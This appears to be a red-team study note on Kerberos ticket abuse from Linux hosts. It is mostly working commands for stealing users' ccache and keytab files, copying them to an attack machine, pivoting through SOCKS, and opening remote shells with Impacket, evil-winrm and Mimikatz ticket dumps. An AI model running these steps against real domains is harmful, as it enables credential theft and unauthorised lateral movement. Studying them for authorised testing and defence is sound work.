---
title: Kerberos on Linux
draft: false
tags:
  - linux
  - active-directory
  - lateral-movement
  - kerberos
  - post-exploitation
---
 
When we compromise a **domain-joined Linux host** (or run tooling from a Linux attack box), we can request, store and reuse Kerberos tickets to move laterally without ever touching a plaintext password. The workflow mirrors Windows Pass-the-Ticket, but the ticket cache lives in a file referenced by the `KRB5CCNAME` environment variable instead of in LSASS (credential cache file that contains the requested Kerberos tickets).

We can find the kerberos cache file in a domain-joined linux host by running:
```bash
env | grep KRB5CCNAME
```

> [!Requirements]
> - Time must be in sync with the DC — Kerberos rejects tickets outside ±5 min. Fix this **first**: see [[Clock Skew]].
> - The domain must resolve (DNS pointing at the DC) and be present in `/etc/krb5.conf` (`[realms]` / `[domain_realm]`).
> - A credential to obtain a TGT: a password, an NT hash (`-key`/RC4), an AES key, or an existing `.ccache` / `.kirbi` ticket.

1. Login to the **domain-joined Linux host** using the Active Directory credentials:
```bash
ssh DOMAIN_USER@DOMAIN@AD_HOSTNAME
```

2. Request a Kerberos ticket-granting ticket (TGT) for the current user:
```bash
kinit

*enter AD password for the current user*
```

3. List tickets currently stored in the user's credential cache file:
```bash
klist
# We should see a TGT for the current user of the current domain:
Ticket cache: FILE:/tmp/krb5cc_607000500_wSiMnP
Default principal: Administrator@CORP1.COM

Valid starting       Expires              Service principal
05/18/2020 15:12:38  05/19/2020 01:12:38  krbtgt/CORP1.COM@CORP1.COM
	renew until 05/25/2020 15:12:36
```

The TGT for the current user is represented with `krbtgt/DOMAIN_FQDN@DOMAIN_FQDN`. This is the TGT for the user that appears in the `Default principal` section. With this TGT we can later list all the SPNs we can access in the Domain.

> [!Note]
> If we want to discard all cached tickets for the current user, we can use the [kdestroy](https://linux.die.net/man/1/kdestroy) command without parameters.

4. Get a list of available Service Principal Names (SPN) from the domain controller for the TGT we have:
```bash
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
...
# SQLSvc, Corp1ServiceAccounts, Corp1Users, corp1.com
dn: CN=SQLSvc,OU=Corp1ServiceAccounts,OU=Corp1Users,DC=corp1,DC=com
servicePrincipalName: MSSQLSvc/DC01.corp1.com:1433 # interesting
servicePrincipalName: MSSQLSvc/DC01.corp1.com:SQLEXPRESS
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:1433
servicePrincipalName: MSSQLSvc/appsrv01.corp1.com:SQLEXPRESS
...

# Parameters:
# -Y GSSAPI: force to use kerberos authentication (if LDAP password is prompted, press enter to use kerberos)
# -D "USER@DOMAIN": specify the current user we are authenticating as using Kerberos
# -b: Domain FQDN
# -H: LDAP URL to DC
```

> [!Note]
> It may ask for an LDAP password, but if we just hit enter at the prompt, it will continue and use Kerberos for authentication.

5. Request a service ticket from Kerberos for the MSSQL SPN for example:
```bash
kvno MSSQLSvc/DC01.corp1.com:1433 # request SPN for MSSQL service

klist # list current tickets
```

---
# Stealing Keytab Files

[Keytab](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html) files allows a user or script to authenticate to Kerberos resources elsewhere on the network on the principal's behalf without entering a password. Its basically a file that contains the AD user and the password encrypted.

> [!Example]
> For example, let's assume a user wants to retrieve data from an MSSQL database via an automated script using Kerberos authentication.The user could create a keytab file for the script to authenticate against the server with their credentials and then retrieve the information on their behalf.

Keytab files are commonly used in [_cron_](https://en.wikipedia.org/wiki/Cron) scripts when Kerberos authentication is needed to access certain resources:
```bash
cat /etc/crontab # enumerate cron scripts

cat CRON_SCRIPT # examine the scripts to check if they are using keytabs for authentication. Paths to keytab files used in these scripts may also reveal which users are associated with which keytabs.
```

**Keytab File Creation**

1. Open an interactive prompt:
```bash
ktutil
```

2. Add an entry to the keytab file for the AD user and specify the encryption type:
```bash
ktutil: addent -password -p AD_USER@DOMAIN_FQDN -k 1 -e rc4-hmac
*enter AD password for the user*

# Parameters:
# -p: AD user which will perform the actions in behalf
# -e: encryption type
```

3. Specify where the keytab file should be written:
```bash
ktutil:  wkt /PATH/TO/FILENAME.keytab

ktuitl: quit
```

> [!Note]
> The generated keytab file grants the same domain user rights to scripts or users that have **read access** to it. If its generated with the domain administrator credentials, it will grant domain admin rights.

**Keytab File Usage**

If kereberos is in use on the system, it is worth checking for keytab files since they usually have weak permissions on the system and might contain interesting tickets to grant us access to AD resources.

1. If we discover the keytab file on a system, we can load it by running:
```bash
kinit KEYTAB_AD_USER@AD_DOMAIN -k -t /PATH/TO/FILENAME.keytab

# Parameters:
# KEYTAB_AD_USER@AD_DOMAIN: AD user used for the keytab file (we can find it by)
# -t: path to the keytab file
```

> [!Note]
> The KEYTAB_AD_USER can be discovered by using cat on the keytab file. If we put the incorrect username (case sensitive), we will get the following error:
> `kinit: Keytab contains no suitable keys for USER@DOMAIN while getting initial credentials`
> The domain is not case sensitive.

2. Verify that the tickets from the keytab have been loaded into our account's CCACHE file:
```
klist
```

If the tickets have expired but they are in the renewal timeframe, we can renew them without entering the password running:
```bash
kinit -R
```

3. We can now access resources the AD user has access to. For example, if we compromised a Domain Admin, we could access the C drive of the DC:
```bash
smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$

smb: \> ls
```

---
# Attacking Using Credential Cache Files

**Scenario 1**

If we compromise an active user's shell session, we can essentially act as the user in question and use their current Kerberos tickets. Gaining an initial TGT would require the user's Active Directory password. However, if the user is already authenticated, we can just use their current tickets.

**Scenario 2**

The second scenario is to authenticate by compromising a user's ccache file. A user's ccache file is stored in /tmp with a format like `/tmp/krb5cc<randomstring>_`. The file is typically only accessible by the owner. Because of this, it's unlikely that we will be able to steal a user's ccache file as an unprivileged user.

If we have privileged access or we are able to read the users files but dont have direct access or dont want to login as the user in question, we can copy the victim's ccache file and load it as our own.

1. List ccache files, check the file owners to check the owners:
```bash
ls -al /tmp/krb5cc_*
```

> [!Note]
> The owners of the ccache files must have had executed a `kinit` and if the realm can not be resolved, they must add the corresponding entries in the `/etc/hosts` file to resolve the DC and the domain. The IP can be found by running `host DOMAIN_FQDN` on a domain-joined host.

2. Copy the target user ccache file and set the ownership to our current user:
```bash
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow

sudo chown CURRENT_USER:CURRENT_USER /tmp/krb5cc_minenow

ls -al /tmp/krb5cc_minenow
```

3. Update our ccache file to the one we stole:
```bash
$ kdestroy # remove our current tickets

$ klist # check tickets have been removed

$ export KRB5CCNAME=/tmp/krb5cc_minenow # export the env variable to the stolen ccache file

$ klist # list the new available tickets
```

4. Request service tickets on behalf of the target user:
```bash
$ kvno SERVICE_PRINCIPAL

$ klist

# Parameters:
# SERVICE_PRINCIPAL: the service principal name that appears when using `klist`. For example: MSSQLSvc/DC01.corp1.com:1433
```

---
# Using Kerberos with Impacket

[Impacket](https://github.com/SecureAuthCorp/impacket) is a set of tools used for low-level manipulation of network protocols and exploiting network-based utilities.

We are going to perform the attacks from our attack machine instead of the compromised linux domain-joined host.

1. List ccache files, check the file owners to check the owners:
```bash
ls -al /tmp/krb5cc_*
```

2. Copy the target user ccache file and set the ownership to our current user:
```bash
sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow

sudo chown CURRENT_USER:CURRENT_USER /tmp/krb5cc_minenow

ls -al /tmp/krb5cc_minenow
```

3. Copy our victim's stolen ccache file to our Kali VM and set the _KRB5CCNAME_ environment variable:
```bash
scp USER@AD_LINUX_HOST:/tmp/krb5cc_minenow /tmp/krb5cc_minenow

export KRB5CCNAME=/tmp/krb5cc_minenow
```

2. Install Kerberos Linux Client utilities:
```bash
sudo apt install krb5-user
```

When prompted for a kerberos realm, we'll enter the target DOMAIN_FQDN. This lets the Kerberos tools know which domain we're connecting to.

3. Resolve the DC IP address from the domain-joined linux host:
```bash
host DOMAIN_FQDN
```

4. Add the domain controller IP to our attack machine to resolve the domain properly in the `/etc/hosts` file:
```
DOMAIN_CONTROLLER_IP DOMAIN_FQDN DC_FQDN
```

Next, we'll need to have the correct source IP (compromised domain-joined linux host) because it must be from the domain. Because of this we'll need to setup a SOCKS proxy on the domain-joined linux host and use proxychains on the attack machine to pivot through the domain joined host when interacting with Kerberos.

5. Comment the `proxy_dns` in **/etc/proxychains4.conf** to prevent issues with domain name resolution while using proxychains:

6. Set up a SOCKS server using **ssh** on the server we copied the ccache file from:
```bash
ssh USER@AD_LINUX_HOST -D SOCKS_PROXY_PORT

# Parameters:
# USER@AD_LINUX_HOST credentials to connect to the domain-joined linux host where the ccache file was extracted
# -D: socks proxy port defined in the /etc/proxychains4.conf
```

> [!Note]
> This will route our traffic through the SOCKS server established on the pivot host (domain-joined computer) and will allow us to evade network restrictions.

7. We can now run commands from our attack host in behalf of the compromised domain user through the compromised domain-joined linux host:
```bash
# List domain users:
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip DC_IP DOMAIN_FQDN/AD_USER

# Parameters:
# -k: use kerberos authentication (ccache file)
# -no-pass: dont prompt for a password
# DOMAIN_FQDN/AD_USER: the AD_USER is the one from the compromised ccache file


# List SPNs available to our current user:
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip DC_IP DOMAIN_FQDN/AD_USER


# Get a shell on a Domain Host:
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py AD_USER@HOST_FQDN -k -no-pass
```

> [!Note]
> In some cases we dont need to use a SOCKS proxy and we can directly execute the commands.

**Windows**

1. Dump Kerberos Ticket Granting Tickets (TGTs) from memory using Mimikatz:
```bash
mimikatz # privilege::debug

mimikatz # sekurlsa::tickets /export
```

2. Convert the .kirbi ticket to ccache file:
```bash
impacket-ticketConverter '[0;2d5077]-2-0-40e10000-Administrator@krbtgt-CORP1.COM.kirbi' administrator.ccache
```

3. Set the _KRB5CCNAME_ environment variable: 
```
export KRB5CCNAME=/tmp/administrator.ccache
```

---
# Requesting a TGT

Impacket's `getTGT` requests a ticket and writes a `.ccache` file we can load into `KRB5CCNAME`:
```bash
# With a plaintext password
$ impacket-getTGT DOMAIN.LOCAL/USER:'PASSWORD'

# Pass-the-Hash into Kerberos (overpass-the-hash) using the NT hash
$ impacket-getTGT DOMAIN.LOCAL/USER -hashes :NT_HASH

# Using an AES256 key (stealthier, avoids RC4 downgrade detection)
$ impacket-getTGT DOMAIN.LOCAL/USER -aesKey AES256_KEY

# Load the ticket for subsequent tools
$ export KRB5CCNAME=$(pwd)/USER.ccache
$ klist   # inspect the loaded ticket
```

The MIT/Heimdal client `kinit` does the same against a real domain-joined host:
```bash
$ kinit USER@DOMAIN.LOCAL       # prompts for the password, populates the default cache
$ klist
```

# Using the ticket (Pass-the-Ticket on Linux)

Once `KRB5CCNAME` points to a valid TGT, pass `-k -no-pass` (Impacket) or `-k` / `--use-kcache` (NetExec) to authenticate with Kerberos instead of a password:
```bash
# Remote command execution via Kerberos
$ impacket-psexec -k -no-pass DOMAIN.LOCAL/USER@TARGET.DOMAIN.LOCAL
$ impacket-wmiexec -k -no-pass DOMAIN.LOCAL/USER@TARGET.DOMAIN.LOCAL

# NetExec / CrackMapExec with the ccache
$ netexec smb TARGET.DOMAIN.LOCAL -k --use-kcache

# WinRM shell over Kerberos
$ evil-winrm -i TARGET.DOMAIN.LOCAL -r DOMAIN.LOCAL
```

> [!Note]
> Kerberos authentication requires connecting to the target by **hostname/FQDN**, never by IP — the SPN is bound to the name. Make sure the target resolves (add it to `/etc/hosts` if needed).

# Converting ticket formats

Windows `.kirbi` tickets (e.g. dumped with Rubeus) can be converted to Linux `.ccache` and back with `impacket-ticketConverter`:
```bash
$ impacket-ticketConverter ticket.kirbi ticket.ccache   # kirbi -> ccache
$ impacket-ticketConverter ticket.ccache ticket.kirbi   # ccache -> kirbi
$ export KRB5CCNAME=$(pwd)/ticket.ccache
```

# Harvesting tickets from a compromised Linux host

Domain-joined Linux hosts store ccache files in `/tmp` and keytabs on disk:
```bash
# Ticket caches (readable if we are root or the owning user)
$ ls -la /tmp/krb5cc_*
$ env | grep KRB5CCNAME

# Keytab files hold long-term keys and can be used to mint tickets
$ find / -name "*.keytab" 2>/dev/null
$ klist -k -t /etc/krb5.keytab
```

> [!Tip]
> A recovered `krb5cc_*` cache belonging to another user is an instant lateral-movement primitive — just export it into `KRB5CCNAME` and reuse it. Root can steal every user's cache in `/tmp`.

---

### Related notes
- [[Clock Skew]] — sync time to the DC **before** any Kerberos operation
- [[Pass the Ticket (PtT)]] — the Windows-side equivalent of this technique
- [[Kerberoasting]] and [[AS-REP Roasting]] — Kerberos-based credential attacks that produce hashes to crack
- [[Linux Lateral Movement and Pivoting]] — broader Linux lateral movement context
- [[Linux Dumping and Cracking Credentials]] — recovering the hashes/keys used to request tickets